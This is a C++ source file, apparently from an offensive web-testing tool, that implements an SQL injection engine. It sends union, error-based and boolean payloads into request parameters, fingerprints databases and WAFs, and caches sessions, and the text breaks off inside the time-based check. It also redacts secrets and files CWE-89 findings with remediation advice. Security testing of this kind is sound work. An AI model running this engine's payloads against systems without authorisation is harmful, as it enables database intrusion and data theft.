#include "sqli_engine.hpp"

#include "offensive_payloads.hpp"

#include "../audit_http.hpp"
#include "../insertion_points.hpp"
#include "../issue.hpp"
#include "../payload_library.hpp"
#include "../scanner_module.hpp"
#include "../scanner_modules/module_http_util.hpp"

#include "../../../mcp/mcp_standalone.hpp"

#include "../../../../helpers/diag_log.hpp"

#include <algorithm>
#include <atomic>
#include <chrono>
#include <cctype>
#include <cstdint>
#include <iomanip>
#include <map>
#include <mutex>
#include <optional>
#include <regex>
#include <set>
#include <sstream>
#include <string>
#include <unordered_map>
#include <unordered_set>
#include <utility>
#include <vector>

namespace aida {
namespace burp {
namespace offensive {
namespace sqli {

namespace {

using json = nlohmann::json;

struct request_target_t
{
    std::string url;
    std::string scheme;
    std::string host;
    std::string path;
    uint16_t port = 0;
    bool tls = false;
    bool enforce_scope = true;
    std::vector<uint8_t> raw;
};

struct finding_t
{
    bool found = false;
    std::string injection_type;
    std::string dbms;
    std::string dbms_version;
    std::string evidence;
    std::string payload;
    std::string union_mode;
    int union_columns = 0;
    int union_marker_column = 0;
    uint64_t issue_id = 0;
    bool waf_blocked = false;
    exchange_observed_t response;
};

struct sqli_session_t
{
    std::string session_id;
    std::string url;
    std::string scheme;
    std::string host;
    std::string path;
    uint16_t port = 0;
    bool tls = false;
    bool enforce_scope = true;
    std::vector<uint8_t> raw_request;
    std::string parameter;
    std::string insertion_kind;
    std::string original_value;
    bool vulnerable = false;
    std::string injection_type;
    std::string dbms = "auto";
    std::string dbms_version;
    int union_columns = 0;
    int union_marker_column = 0;
    std::string union_mode;
    bool waf_detected = false;
    std::string waf_name;
    std::vector<uint64_t> issue_ids;
    int baseline_status = 0;
    uint64_t baseline_latency_ms = 0;
    std::vector<uint8_t> baseline_body;
    std::vector<std::pair<std::string, std::string>> baseline_headers;
    uint64_t created_ms = 0;
    uint64_t updated_ms = 0;
    std::string last_action = "detect";
    std::string status = "complete";
    json results = json::array();
    std::map<std::string, json> cached_tables;
    std::map<std::string, json> cached_columns;
};

struct state_t
{
    std::mutex mtx;
    std::unordered_map<std::string, sqli_session_t> sessions;
    std::atomic<uint64_t> counter{0};
};

state_t& state()
{
    static state_t s;
    return s;
}

uint64_t now_ms_wall()
{
    using namespace std::chrono;
    return static_cast<uint64_t>(duration_cast<milliseconds>(system_clock::now().time_since_epoch()).count());
}

uint64_t now_ms_steady()
{
    using namespace std::chrono;
    return static_cast<uint64_t>(duration_cast<milliseconds>(steady_clock::now().time_since_epoch()).count());
}

uint64_t mix64(uint64_t v)
{
    v += 0x9E3779B97F4A7C15ull;
    v = (v ^ (v >> 30)) * 0xBF58476D1CE4E5B9ull;
    v = (v ^ (v >> 27)) * 0x94D049BB133111EBull;
    return v ^ (v >> 31);
}

std::string base36(uint64_t v)
{
    static const char a[] = "0123456789abcdefghijklmnopqrstuvwxyz";
    if (v == 0) return "0";
    std::string out;
    while (v) {
        out.push_back(a[v % 36]);
        v /= 36;
    }
    std::reverse(out.begin(), out.end());
    return out;
}

std::string make_id(const char* prefix)
{
    uint64_t c = state().counter.fetch_add(1, std::memory_order_relaxed) + 1;
    uint64_t seed = mix64(now_ms_steady() ^ (c * 0xD6E8FEB86659FD93ull));
    return std::string(prefix) + "_" + base36(now_ms_wall()) + "_" + base36(seed);
}

engine_result_t error_result(const std::string& message, const std::string& code, json data = json::object())
{
    data["success"] = false;
    data["code"] = code;
    return {false, message, code, std::move(data)};
}

engine_result_t ok_result(const std::string& message, json data)
{
    data["success"] = true;
    return {true, message, {}, std::move(data)};
}

std::string lower_ascii(std::string s)
{
    std::transform(s.begin(), s.end(), s.begin(), [](unsigned char c) {
        return static_cast<char>(std::tolower(c));
    });
    return s;
}

std::string upper_ascii(std::string s)
{
    std::transform(s.begin(), s.end(), s.begin(), [](unsigned char c) {
        return static_cast<char>(std::toupper(c));
    });
    return s;
}

bool header_name_equals(const std::string& a, const std::string& b)
{
    return lower_ascii(a) == lower_ascii(b);
}

std::string header_value(const std::vector<std::pair<std::string, std::string>>& headers, const std::string& name)
{
    for (const auto& h : headers) {
        if (header_name_equals(h.first, name)) return h.second;
    }
    return {};
}

std::string trim_copy(std::string s)
{
    while (!s.empty() && std::isspace(static_cast<unsigned char>(s.front()))) s.erase(s.begin());
    while (!s.empty() && std::isspace(static_cast<unsigned char>(s.back()))) s.pop_back();
    return s;
}

uint64_t fnv1a64(const std::string& s)
{
    uint64_t h = 1469598103934665603ull;
    for (unsigned char c : s) {
        h ^= static_cast<uint64_t>(c);
        h *= 1099511628211ull;
    }
    return h;
}

uint64_t fnv1a64_bytes(const std::vector<uint8_t>& s)
{
    uint64_t h = 1469598103934665603ull;
    for (uint8_t c : s) {
        h ^= static_cast<uint64_t>(c);
        h *= 1099511628211ull;
    }
    return h;
}

std::string hex64(uint64_t v)
{
    std::ostringstream os;
    os << std::hex << std::setw(16) << std::setfill('0') << v;
    return os.str();
}

std::string sensitive_summary(const std::string& value)
{
    return std::string("[REDACTED len=") + std::to_string(value.size()) + " fnv64=" + hex64(fnv1a64(value)) + "]";
}

bool sensitive_name(const std::string& name)
{
    const std::string n = lower_ascii(name);
    static const char* needles[] = {
        "authorization", "cookie", "set-cookie", "token", "secret", "password", "passwd",
        "apikey", "api-key", "api_key", "private", "license", "session", "bearer", "hmac"
    };
    for (const char* needle : needles) {
        if (n.find(needle) != std::string::npos) return true;
    }
    return false;
}

std::string redact_sensitive_text(std::string text, size_t limit)
{
    if (text.size() > limit) text.resize(limit);
    static const std::regex bearer(R"((Bearer\s+)[A-Za-z0-9._~+/=-]{12,})", std::regex::icase);
    static const std::regex aida_license(R"(AIDA-[A-Za-z0-9-]{8,})", std::regex::icase);
    static const std::regex aws_key(R"(AKIA[0-9A-Z]{16})");
    static const std::regex generic_secret(R"(((token|secret|api[_-]?key|password|passwd|license)\s*[:=]\s*['"]?)[^'"\s&<]{8,})", std::regex::icase);
    text = std::regex_replace(text, bearer, "$1[REDACTED]");
    text = std::regex_replace(text, aida_license, "AIDA-[REDACTED]");
    text = std::regex_replace(text, aws_key, "AKIA[REDACTED]");
    text = std::regex_replace(text, generic_secret, "$1[REDACTED]");
    for (char& c : text) {
        unsigned char uc = static_cast<unsigned char>(c);
        if (uc < 0x20 && c != '\r' && c != '\n' && c != '\t') c = '.';
    }
    return text;
}

std::string body_text(const exchange_observed_t& resp, size_t limit = 65536)
{
    const size_t n = std::min(resp.resp_body.size(), limit);
    if (n == 0) return {};
    return std::string(reinterpret_cast<const char*>(resp.resp_body.data()), n);
}

bool body_contains(const exchange_observed_t& resp, const std::string& needle)
{
    if (needle.empty() || resp.resp_body.size() < needle.size()) return false;
    return std::search(resp.resp_body.begin(), resp.resp_body.end(), needle.begin(), needle.end()) != resp.resp_body.end();
}

std::string snippet_around(const exchange_observed_t& resp, const std::string& needle, size_t pad)
{
    if (needle.empty() || resp.resp_body.empty()) return {};
    auto it = std::search(resp.resp_body.begin(), resp.resp_body.end(), needle.begin(), needle.end());
    if (it == resp.resp_body.end()) return {};
    const size_t pos = static_cast<size_t>(it - resp.resp_body.begin());
    const size_t start = pos > pad ? pos - pad : 0;
    const size_t end = std::min(resp.resp_body.size(), pos + needle.size() + pad);
    std::string s(reinterpret_cast<const char*>(resp.resp_body.data() + start), end - start);
    return redact_sensitive_text(s, 1024);
}

bool json_bool(const json& p, const char* key, bool fallback)
{
    if (p.contains(key) && p[key].is_boolean()) return p[key].get<bool>();
    return fallback;
}

int json_int(const json& p, const char* key, int fallback, int min_v, int max_v)
{
    int v = fallback;
    if (p.contains(key) && p[key].is_number_integer()) v = p[key].get<int>();
    else if (p.contains(key) && p[key].is_number_unsigned()) v = static_cast<int>(p[key].get<uint64_t>());
    if (v < min_v) v = min_v;
    if (v > max_v) v = max_v;
    return v;
}

std::string json_string(const json& p, const char* key, const std::string& fallback = {})
{
    if (p.contains(key) && p[key].is_string()) return p[key].get<std::string>();
    return fallback;
}

std::vector<std::string> json_string_array(const json& p, const char* key, const std::vector<std::string>& fallback)
{
    if (!p.contains(key)) return fallback;
    if (p[key].is_string()) return {p[key].get<std::string>()};
    if (!p[key].is_array()) return fallback;
    std::vector<std::string> out;
    for (const auto& v : p[key]) {
        if (v.is_string()) out.push_back(v.get<std::string>());
    }
    return out.empty() ? fallback : out;
}

bool cancelled()
{
    if (mcp_standalone::current_call_cancelled()) return true;
    const uint64_t deadline = mcp_standalone::current_call_deadline_ms();
    return deadline != 0 && now_ms_steady() >= deadline;
}

bool valid_method_token(const std::string& method)
{
    if (method.empty() || method.size() > 32) return false;
    for (unsigned char c : method) {
        if (std::isalnum(c)) continue;
        switch (c) {
            case '!': case '#': case '$': case '%': case '&': case '\'': case '*':
            case '+': case '-': case '.': case '^': case '_': case '`': case '|': case '~':
                continue;
            default:
                return false;
        }
    }
    return true;
}

std::string header_safe(std::string s)
{
    for (char& c : s) {
        unsigned char uc = static_cast<unsigned char>(c);
        if (uc < 0x20 || uc == 0x7F) c = '_';
    }
    return s;
}

std::string json_scalar_to_string(const json& v)
{
    if (v.is_string()) return v.get<std::string>();
    if (v.is_number() || v.is_boolean() || v.is_null()) return v.dump();
    return v.dump();
}

bool parse_headers_param(const json& params, std::vector<std::pair<std::string, std::string>>& out, std::string& err)
{
    if (!params.contains("headers")) return true;
    const json* h = &params["headers"];
    json parsed;
    if (h->is_string()) {
        try {
            parsed = json::parse(h->get<std::string>());
            h = &parsed;
        } catch (...) {
            err = "headers string must contain JSON";
            return false;
        }
    }
    if (h->is_object()) {
        for (auto it = h->begin(); it != h->end(); ++it) out.emplace_back(it.key(), json_scalar_to_string(it.value()));
        return true;
    }
    if (h->is_array()) {
        for (const auto& e : *h) {
            if (e.is_array() && e.size() == 2 && e[0].is_string()) {
                out.emplace_back(e[0].get<std::string>(), json_scalar_to_string(e[1]));
            } else if (e.is_object() && e.contains("name") && e["name"].is_string() && e.contains("value")) {
                out.emplace_back(e["name"].get<std::string>(), json_scalar_to_string(e["value"]));
            } else {
                err = "headers array entries must be [name,value] or {name,value}";
                return false;
            }
        }
        return true;
    }
    err = "headers must be an object, array, or JSON string";
    return false;
}

std::string form_encode_params(const json& params)
{
    if (!params.is_object()) return {};
    std::string out;
    for (auto it = params.begin(); it != params.end(); ++it) {
        if (!out.empty()) out += "&";
        out += insertion_points::url_encode(it.key());
        out += "=";
        out += insertion_points::url_encode(json_scalar_to_string(it.value()));
    }
    return out;
}

std::string append_query(std::string path, const json& params)
{
    const std::string q = form_encode_params(params);
    if (q.empty()) return path;
    const size_t hash = path.find('#');
    std::string fragment;
    if (hash != std::string::npos) {
        fragment = path.substr(hash);
        path.erase(hash);
    }
    path += path.find('?') == std::string::npos ? "?" : "&";
    path += q;
    path += fragment;
    return path;
}

bool body_is_json(const std::string& body)
{
    if (body.empty()) return false;
    try {
        (void)json::parse(body);
        return true;
    } catch (...) {
        return false;
    }
}

bool build_request(const json& params, request_target_t& out, std::string& err)
{
    if (!params.contains("url") || !params["url"].is_string()) {
        err = "missing url";
        return false;
    }
    out.url = params["url"].get<std::string>();
    if (!audit_http::parse_url(out.url, out.scheme, out.host, out.port, out.path)) {
        err = "invalid url";
        return false;
    }
    out.tls = lower_ascii(out.scheme) == "https";
    out.enforce_scope = json_bool(params, "scope_only", true);
    std::string method = upper_ascii(json_string(params, "method", "GET"));
    if (method.empty()) method = "GET";
    if (!valid_method_token(method)) {
        err = "invalid method";
        return false;
    }
    std::string body = json_string(params, "body");
    if (params.contains("params") && params["params"].is_object()) {
        if (method == "GET" || method == "HEAD" || method == "DELETE") {
            out.path = append_query(out.path, params["params"]);
        } else if (body.empty()) {
            body = form_encode_params(params["params"]);
        }
    }
    std::vector<std::pair<std::string, std::string>> headers;
    if (!parse_headers_param(params, headers, err)) return false;
    bool has_content_type = false;
    bool has_accept = false;
    bool has_user_agent = false;
    for (const auto& h : headers) {
        if (header_name_equals(h.first, "Content-Type")) has_content_type = true;
        if (header_name_equals(h.first, "Accept")) has_accept = true;
        if (header_name_equals(h.first, "User-Agent")) has_user_agent = true;
    }
    std::string host_header = out.host;
    const bool default_port = (out.tls && out.port == 443) || (!out.tls && out.port == 80);
    if (!default_port) {
        host_header += ":";
        host_header += std::to_string(out.port);
    }
    std::string raw;
    raw.reserve(method.size() + out.path.size() + host_header.size() + body.size() + 512);
    raw += method;
    raw += " ";
    raw += out.path.empty() ? std::string("/") : out.path;
    raw += " HTTP/1.1\r\nHost: ";
    raw += header_safe(host_header);
    raw += "\r\n";
    if (!has_user_agent) raw += "User-Agent: AiDA-Offensive-SQLi/1.0\r\n";
    if (!has_accept) raw += "Accept: */*\r\n";
    raw += "Accept-Encoding: identity\r\n";
    for (const auto& h : headers) {
        if (h.first.empty()) continue;
        if (header_name_equals(h.first, "Host") || header_name_equals(h.first, "Content-Length") || header_name_equals(h.first, "Connection")) continue;
        raw += header_safe(h.first);
        raw += ": ";
        raw += header_safe(h.second);
        raw += "\r\n";
    }
    if (!body.empty() || method == "POST" || method == "PUT" || method == "PATCH") {
        if (!has_content_type) {
            raw += "Content-Type: ";
            raw += body_is_json(body) ? "application/json" : "application/x-www-form-urlencoded";
            raw += "\r\n";
        }
        raw += "Content-Length: ";
        raw += std::to_string(body.size());
        raw += "\r\n";
    }
    raw += "Connection: close\r\n\r\n";
    raw += body;
    out.raw.assign(raw.begin(), raw.end());
    return true;
}

std::optional<exchange_observed_t> send_raw(const request_target_t& target,
                                            const std::vector<uint8_t>& raw,
                                            int timeout_ms,
                                            const char* source)
{
    audit_http::send_options_t opt;
    opt.timeout_ms = timeout_ms;
    opt.follow_redirects = false;
    opt.enforce_scope = target.enforce_scope;
    opt.publish_exchange = true;
    opt.exchange_source = source ? source : "offensive_sqli";
    return audit_http::send(raw, target.host, target.port, target.tls, opt);
}

std::vector<insertion_point_t> candidate_points(const request_target_t& target, const std::string& param_target)
{
    auto points = insertion_points::analyze(target.raw, target.url);
    points.erase(std::remove_if(points.begin(), points.end(), [&](const insertion_point_t& ip) {
        if (ip.kind != "query" && ip.kind != "body_form" && ip.kind != "body_json" && ip.kind != "cookie" && ip.kind != "path") return true;
        return !param_target.empty() && ip.name != param_target;
    }), points.end());
    return points;
}

std::vector<uint8_t> build_injected(const insertion_point_t& ip, const std::string& value)
{
    if (ip.build_with_options) {
        insertion_point_build_options_t opt;
        opt.force_json_string = true;
        opt.preserve_json_scalar_type = false;
        return ip.build_with_options(value, opt);
    }
    if (ip.build) return ip.build(value);
    return std::vector<uint8_t>(ip.base_request.begin(), ip.base_request.end());
}

bool numeric_like(const std::string& s)
{
    if (s.empty()) return false;
    size_t i = 0;
    if (s[i] == '-' || s[i] == '+') ++i;
    bool digit = false;
    for (; i < s.size(); ++i) {
        if (std::isdigit(static_cast<unsigned char>(s[i]))) {
            digit = true;
            continue;
        }
        if (s[i] == '.') continue;
        return false;
    }
    return digit;
}

std::string compose_payload_value(const std::string& original, const std::string& payload)
{
    if (original.empty()) return payload;
    if (payload.empty()) return original;
    const char c = payload.front();
    if (c == '\'' || c == '"' || c == ')' || c == ';' || c == ' ' || c == '-' || c == '/' || c == '#') return original + payload;
    if (numeric_like(original) && std::isdigit(static_cast<unsigned char>(c))) return payload;
    return original + payload;
}

bool sql_error_match(const exchange_observed_t& resp, std::string& matched, std::string& dbms)
{
    const std::string text = lower_ascii(body_text(resp, 32768));
    struct sig_t { const char* needle; const char* label; };
    static const sig_t sigs[] = {
        {"sql syntax", "unknown"},
        {"mysql", "mysql"},
        {"mariadb", "mysql"},
        {"postgresql", "postgres"},
        {"pg::syntaxerror", "postgres"},
        {"unterminated quoted string", "postgres"},
        {"ora-", "oracle"},
        {"oracle", "oracle"},
        {"sqlite", "sqlite"},
        {"odbc sql server", "mssql"},
        {"system.data.sqlclient", "mssql"},
        {"unclosed quotation mark", "mssql"},
        {"sqlstate", "unknown"},
        {"java.sql.sqlexception", "unknown"},
        {"sqlsyntaxerrorexception", "unknown"},
        {"badsqlgrammarexception", "unknown"}
    };
    for (const auto& sig : sigs) {
        const size_t p = text.find(sig.needle);
        if (p != std::string::npos) {
            const size_t start = p > 80 ? p - 80 : 0;
            matched = redact_sensitive_text(text.substr(start, 220), 220);
            dbms = sig.label;
            return true;
        }
    }
    return false;
}

std::string dbms_from_response(const exchange_observed_t& resp)
{
    std::string ignored;
    std::string dbms;
    if (sql_error_match(resp, ignored, dbms) && dbms != "unknown") return dbms;
    const std::string text = lower_ascii(body_text(resp, 32768));
    if (text.find("mysql") != std::string::npos || text.find("mariadb") != std::string::npos) return "mysql";
    if (text.find("postgres") != std::string::npos) return "postgres";
    if (text.find("microsoft sql") != std::string::npos || text.find("sql server") != std::string::npos) return "mssql";
    if (text.find("oracle") != std::string::npos || text.find("ora-") != std::string::npos) return "oracle";
    if (text.find("sqlite") != std::string::npos) return "sqlite";
    return "auto";
}

bool blocked_by_waf(const exchange_observed_t& resp, std::string& waf_name, std::string& evidence)
{
    std::vector<std::string> ev;
    const std::string server = lower_ascii(header_value(resp.resp_headers, "Server"));
    const std::string cf_ray = header_value(resp.resp_headers, "CF-Ray");
    const std::string sucuri = header_value(resp.resp_headers, "X-Sucuri-ID");
    const std::string akamai = header_value(resp.resp_headers, "Akamai-Origin-Hop");
    const std::string xwaf = header_value(resp.resp_headers, "X-WAF");
    const std::string text = lower_ascii(body_text(resp, 16384));
    if (server.find("cloudflare") != std::string::npos || !cf_ray.empty()) {
        waf_name = "Cloudflare";
        ev.push_back("Cloudflare header evidence");
    } else if (server.find("akamai") != std::string::npos || !akamai.empty()) {
        waf_name = "Akamai";
        ev.push_back("Akamai header evidence");
    } else if (!sucuri.empty() || text.find("sucuri") != std::string::npos) {
        waf_name = "Sucuri";
        ev.push_back("Sucuri header/body evidence");
    } else if (!xwaf.empty()) {
        waf_name = xwaf.size() > 80 ? xwaf.substr(0, 80) : xwaf;
        ev.push_back("X-WAF header present");
    } else if (text.find("mod_security") != std::string::npos || text.find("modsecurity") != std::string::npos) {
        waf_name = "ModSecurity";
        ev.push_back("ModSecurity body evidence");
    }
    if (resp.status_code == 403 || resp.status_code == 406 || resp.status_code == 409 || resp.status_code == 429 || resp.status_code == 503) {
        ev.push_back(std::string("blocked status ") + std::to_string(resp.status_code));
    }
    static const char* body_needles[] = {
        "request blocked", "access denied", "malicious", "not acceptable", "security policy",
        "web application firewall", "waf", "attack detected", "forbidden"
    };
    for (const char* n : body_needles) {
        if (text.find(n) != std::string::npos) {
            ev.push_back(std::string("body contains ") + n);
            break;
        }
    }
    if (ev.empty()) return false;
    if (waf_name.empty()) waf_name = "generic";
    std::ostringstream os;
    for (size_t i = 0; i < ev.size(); ++i) {
        if (i) os << "; ";
        os << ev[i];
    }
    evidence = os.str();
    return true;
}

json response_summary(const exchange_observed_t& resp)
{
    json j;
    j["status_code"] = resp.status_code;
    j["latency_ms"] = resp.latency_ms;
    j["body_length"] = resp.resp_body.size();
    j["body_hash"] = hex64(fnv1a64_bytes(resp.resp_body));
    std::string location = header_value(resp.resp_headers, "Location");
    if (!location.empty()) j["location"] = redact_sensitive_text(location, 300);
    return j;
}

std::string render_sanitized_request_brief(const exchange_observed_t& resp)
{
    std::ostringstream os;
    os << (resp.method.empty() ? std::string("GET") : resp.method) << " " << (resp.path.empty() ? std::string("/") : resp.path);
    if (!resp.query.empty()) os << "?[query len=" << resp.query.size() << " fnv64=" << hex64(fnv1a64(resp.query)) << "]";
    os << " HTTP/1.1\r\nHost: " << resp.host;
    if (resp.port != 0 && resp.port != 80 && resp.port != 443) os << ":" << resp.port;
    os << "\r\n";
    for (const auto& h : resp.req_headers) {
        if (header_name_equals(h.first, "Host")) continue;
        os << h.first << ": ";
        os << (sensitive_name(h.first) ? sensitive_summary(h.second) : redact_sensitive_text(h.second, 512));
        os << "\r\n";
    }
    os << "\r\n";
    if (!resp.req_body.empty()) os << "[body len=" << resp.req_body.size() << " fnv64=" << hex64(fnv1a64_bytes(resp.req_body)) << "]";
    return os.str();
}

std::string render_sanitized_response_brief(const exchange_observed_t& resp, const std::string& evidence)
{
    std::ostringstream os;
    os << "HTTP/1.1 " << resp.status_code << " " << resp.reason_phrase << "\r\n";
    for (const auto& h : resp.resp_headers) {
        os << h.first << ": ";
        os << (sensitive_name(h.first) ? sensitive_summary(h.second) : redact_sensitive_text(h.second, 512));
        os << "\r\n";
    }
    os << "\r\n";
    os << "[body len=" << resp.resp_body.size() << " fnv64=" << hex64(fnv1a64_bytes(resp.resp_body)) << "]";
    if (!evidence.empty()) os << "\r\nevidence=" << redact_sensitive_text(evidence, 1024);
    return os.str();
}

uint64_t add_issue(const std::string& type_key,
                   const std::string& name,
                   severity_t severity,
                   confidence_t confidence,
                   const request_target_t& target,
                   const insertion_point_t& ip,
                   const exchange_observed_t& resp,
                   const std::string& marker,
                   const std::string& evidence,
                   uint64_t audit_id = 0)
{
    issue_store::initialize();
    issue_t iss;
    iss.type_key = type_key;
    iss.name = name;
    iss.description = "The offensive SQLi engine observed response evidence consistent with SQL injection in the tested insertion point.";
    iss.remediation = "Use parameterized queries or server-side bind variables for all database access and avoid concatenating untrusted request data into SQL.";
    iss.cwe.push_back("CWE-89");
    iss.severity = severity;
    iss.confidence = confidence;
    iss.scheme = resp.scheme.empty() ? target.scheme : resp.scheme;
    iss.host = resp.host.empty() ? target.host : resp.host;
    iss.port = resp.port == 0 ? target.port : resp.port;
    iss.path = resp.path.empty() ? target.path : resp.path;
    iss.parameter = ip.name;
    iss.insertion_point = ip.kind + (ip.name.empty() ? std::string() : ":" + ip.name);
    iss.seen_ms = now_ms_wall();
    iss.src_exchange_id = resp.id;
    iss.audit_id = audit_id;
    evidence_t ev;
    ev.marker = marker.empty() ? redact_sensitive_text(evidence, 1024) : marker;
    ev.request_raw = render_sanitized_request_brief(resp);
    ev.response_raw = render_sanitized_response_brief(resp, evidence);
    iss.evidence.push_back(std::move(ev));
    return issue_store::add(std::move(iss));
}

void append_issue_id(json& arr, uint64_t id)
{
    if (id != 0) arr.push_back(std::to_string(id));
}

void update_session(const sqli_session_t& session)
{
    std::lock_guard<std::mutex> lk(state().mtx);
    state().sessions[session.session_id] = session;
}

bool load_session(const json& params, sqli_session_t& out, engine_result_t& err)
{
    const std::string id = json_string(params, "session_id");
    if (id.empty()) {
        err = error_result("missing session_id", "missing_session_id");
        return false;
    }
    std::lock_guard<std::mutex> lk(state().mtx);
    auto it = state().sessions.find(id);
    if (it == state().sessions.end()) {
        err = error_result("session not found", "session_not_found", {{"session_id", id}});
        return false;
    }
    out = it->second;
    return true;
}

json session_public_status(const sqli_session_t& s)
{
    json j;
    j["session_id"] = s.session_id;
    j["url"] = s.url;
    j["host"] = s.host;
    j["path"] = s.path;
    j["parameter"] = s.parameter;
    j["insertion_point"] = s.insertion_kind;
    j["vulnerable"] = s.vulnerable;
    j["injection_type"] = s.injection_type;
    j["dbms"] = s.dbms;
    j["dbms_version"] = s.dbms_version;
    j["union_columns"] = s.union_columns;
    j["waf_detected"] = s.waf_detected;
    j["waf_name"] = s.waf_name;
    j["issue_ids"] = json::array();
    for (uint64_t id : s.issue_ids) j["issue_ids"].push_back(std::to_string(id));
    j["created_ms"] = s.created_ms;
    j["updated_ms"] = s.updated_ms;
    j["last_action"] = s.last_action;
    j["status"] = s.status;
    j["baseline_status"] = s.baseline_status;
    j["baseline_latency_ms"] = s.baseline_latency_ms;
    return j;
}

bool response_boolean_delta(const exchange_observed_t& false_resp,
                            const exchange_observed_t& true_resp,
                            std::string& evidence)
{
    auto diff = scanner::compare_responses(false_resp, true_resp);
    if (diff.status_changed && diff.response_status > 0 && diff.baseline_status > 0) {
        evidence = "opposing boolean payloads changed response status; " + diff.evidence;
        return true;
    }
    if (diff.location_changed) {
        evidence = "opposing boolean payloads changed Location header; " + diff.evidence;
        return true;
    }
    if (diff.meaningful_body_delta && diff.body_length_delta > 64) {
        evidence = "opposing boolean payloads changed response body; " + diff.evidence;
        return true;
    }
    return false;
}

std::string sql_literal(const std::string& value)
{
    std::string out = "'";
    for (char c : value) {
        if (c == '\'') out += "''";
        else out.push_back(c);
    }
    out += "'";
    return out;
}

bool safe_identifier(const std::string& s)
{
    if (s.empty() || s.size() > 128) return false;
    for (unsigned char c : s) {
        if (std::isalnum(c) || c == '_' || c == '$' || c == '.') continue;
        return false;
    }
    return true;
}

std::string concat_expr(const std::string& dbms, const std::string& marker, const std::string& scalar_query)
{
    const std::string d = lower_ascii(dbms);
    if (d == "postgres") return "(" + sql_literal(marker) + "||COALESCE(CAST((" + scalar_query + ") AS TEXT),'')||" + sql_literal(marker) + ")";
    if (d == "mssql") return "(" + sql_literal(marker) + "+ISNULL(CAST((" + scalar_query + ") AS NVARCHAR(4000)),'')+" + sql_literal(marker) + ")";
    if (d == "oracle") return "(" + sql_literal(marker) + "||NVL(TO_CHAR((" + scalar_query + ")),'')||" + sql_literal(marker) + ")";
    if (d == "sqlite") return "(" + sql_literal(marker) + "||IFNULL(CAST((" + scalar_query + ") AS TEXT),'')||" + sql_literal(marker) + ")";
    return "CONCAT(" + sql_literal(marker) + ",IFNULL(CAST((" + scalar_query + ") AS CHAR),'')," + sql_literal(marker) + ")";
}

std::string union_payload(const std::string& original,
                          const std::string& mode,
                          int columns,
                          int marker_column,
                          const std::string& expression)
{
    std::vector<std::string> cols;
    for (int i = 1; i <= columns; ++i) cols.push_back(i == marker_column ? expression : "NULL");
    std::ostringstream selected;
    for (size_t i = 0; i < cols.size(); ++i) {
        if (i) selected << ",";
        selected << cols[i];
    }
    const std::string suffix = " UNION ALL SELECT " + selected.str() + "-- -";
    if (mode == "single_quote") return original + "'" + suffix;
    if (mode == "double_quote") return original + "\"" + suffix;
    if (mode == "paren_numeric") return original + ")" + suffix;
    if (mode == "paren_single") return original + "')" + suffix;
    return numeric_like(original) ? original + suffix : original + "'" + suffix;
}

std::vector<std::string> union_modes_for(const std::string& original)
{
    std::vector<std::string> modes;
    if (numeric_like(original)) modes.push_back("numeric");
    modes.push_back("single_quote");
    modes.push_back("double_quote");
    modes.push_back("paren_numeric");
    modes.push_back("paren_single");
    return modes;
}

finding_t run_union_checks(const request_target_t& target,
                           const insertion_point_t& ip,
                           const exchange_observed_t& baseline,
                           int timeout_ms,
                           int level)
{
    finding_t out;
    const int max_columns = std::min(12, 4 + level * 2);
    for (const auto& mode : union_modes_for(ip.original_value)) {
        for (int cols = 1; cols <= max_columns; ++cols) {
            for (int marker_col = 1; marker_col <= cols; ++marker_col) {
                if (cancelled()) return out;
                const std::string marker = make_id("AIDAU");
                const std::string payload = union_payload(ip.original_value, mode, cols, marker_col, sql_literal(marker));
                auto raw = build_injected(ip, payload);
                auto resp = send_raw(target, raw, timeout_ms, "offensive_sqli.union");
                if (!resp.has_value()) continue;
                if (body_contains(*resp, marker)) {
                    out.found = true;
                    out.injection_type = "union";
                    out.union_mode = mode;
                    out.union_columns = cols;
                    out.union_marker_column = marker_col;
                    out.payload = payload;
                    out.evidence = "unique union marker reflected in response; " + snippet_around(*resp, marker, 80);
                    out.dbms = dbms_from_response(*resp);
                    out.response = *resp;
                    return out;
                }
                std::string waf_name;
                std::string waf_ev;
                if (blocked_by_waf(*resp, waf_name, waf_ev)) {
                    out.waf_blocked = true;
                    out.evidence = waf_ev;
                }
            }
        }
    }
    (void)baseline;
    return out;
}

finding_t run_error_checks(const request_target_t& target,
                           const insertion_point_t& ip,
                           int timeout_ms,
                           int level,
                           const std::string& dbms)
{
    finding_t out;
    auto payloads = offensive::payloads::sqli_payloads({"error"}, dbms, static_cast<size_t>(std::max(6, level * 8)));
    for (const auto& p : payloads) {
        if (cancelled()) return out;
        const std::string injected = compose_payload_value(ip.original_value, p.value);
        auto resp = send_raw(target, build_injected(ip, injected), timeout_ms, "offensive_sqli.error");
        if (!resp.has_value()) continue;
        std::string matched;
        std::string found_dbms;
        if (sql_error_match(*resp, matched, found_dbms)) {
            out.found = true;
            out.injection_type = "error";
            out.dbms = found_dbms;
            out.evidence = "database error signature observed: " + matched;
            out.payload = injected;
            out.response = *resp;
            return out;
        }
        std::string waf_name;
        std::string waf_ev;
        if (blocked_by_waf(*resp, waf_name, waf_ev)) {
            out.waf_blocked = true;
            out.evidence = waf_ev;
        }
    }
    return out;
}

finding_t run_boolean_checks(const request_target_t& target,
                             const insertion_point_t& ip,
                             int timeout_ms,
                             int level)
{
    finding_t out;
    const auto trues = ::aida::burp::payloads::entries("sqli/boolean_true", static_cast<size_t>(std::max(4, level * 6)));
    const auto falses = ::aida::burp::payloads::entries("sqli/boolean_false", static_cast<size_t>(std::max(4, level * 6)));
    const size_t n = std::min(trues.size(), falses.size());
    for (size_t i = 0; i < n; ++i) {
        if (cancelled()) return out;
        const std::string tv = compose_payload_value(ip.original_value, trues[i]);
        const std::string fv = compose_payload_value(ip.original_value, falses[i]);
        auto rt = send_raw(target, build_injected(ip, tv), timeout_ms, "offensive_sqli.boolean_true");
        auto rf = send_raw(target, build_injected(ip, fv), timeout_ms, "offensive_sqli.boolean_false");
        if (!rt.has_value() || !rf.has_value()) continue;
        std::string evidence;
        if (response_boolean_delta(*rf, *rt, evidence)) {
            out.found = true;
            out.injection_type = "boolean";
            out.payload = tv;
            out.evidence = evidence;
            out.dbms = dbms_from_response(*rt);
            out.response = *rt;
            return out;
        }
        std::string waf_name;
        std::string waf_ev;
        if (blocked_by_waf(*rt, waf_name, waf_ev) || blocked_by_waf(*rf, waf_name, waf_ev)) {
            out.waf_blocked = true;
            out.evidence = waf_ev;
        }
    }
    return out;
}

finding_t run_time_checks(const request_target_t& target,
                          const insertion_point_t& ip,
                          const exchange_observed_t& baseline,
                          int timeout_ms,
                          int level,
                          const std::string& dbms)
{
    finding_t out;
